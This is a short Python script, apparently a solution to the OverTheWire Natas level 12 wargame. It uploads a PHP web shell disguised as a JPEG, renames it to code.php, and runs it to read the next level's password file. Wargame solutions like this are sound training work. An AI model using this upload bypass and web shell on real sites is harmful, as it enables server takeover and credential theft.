import requests
import re
from requests.auth import HTTPBasicAuth
def solve12(username, password):
    session = requests.session()
    uploadData = "------WebKitFormBoundaryuXuSkExEPOTrNaMz\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n1000\r\n------WebKitFormBoundaryuXuSkExEPOTrNaMz\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\ncode.php\r\n------WebKitFormBoundaryuXuSkExEPOTrNaMz\r\nContent-Disposition: form-data; name=\"uploadedfile\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo shell_exec(\"cat /etc/natas_webpass/natas13\"); ?>\n\r\n------WebKitFormBoundaryuXuSkExEPOTrNaMz--\r\n"
    session.headers["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundaryuXuSkExEPOTrNaMz"
    session.auth = HTTPBasicAuth(username, password)
    resp = session.post("http://natas12.natas.labs.overthewire.org/index.php", data=uploadData)
    url = re.findall(r'upload\/[^\.]+\.php', resp.text)[-1]
    resp = session.get("http://natas12.natas.labs.overthewire.org/" + url)
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw